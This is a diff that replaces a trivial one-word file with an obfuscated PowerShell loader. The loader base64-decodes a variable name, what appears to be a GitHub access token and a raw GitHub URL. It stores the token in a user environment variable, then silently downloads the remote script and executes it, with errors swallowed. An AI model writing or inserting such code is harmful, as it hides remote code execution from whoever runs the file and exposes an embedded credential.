@@ -1,1 +1,14 @@
-hay
+$a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R0hfVE9LRU4="))
+$b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z2hwX1REM3k1SWIwcUN2RTJ5MDRPUHkyNk82a3NTRV92MklIWks="))
+$c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dob3N0LW12dC9YVVovbWFpbi9tYWluLnBzMQ=="))
+
+$d = "Net.WebClient"
+$e = New-Object $d
+[System.Environment]::SetEnvironmentVariable($a, $b, 'User')
+
+try {
+    $f = $e.DownloadString($c)
+    $g = [scriptblock]::Create($f)
+    & $g
+} catch {
+}
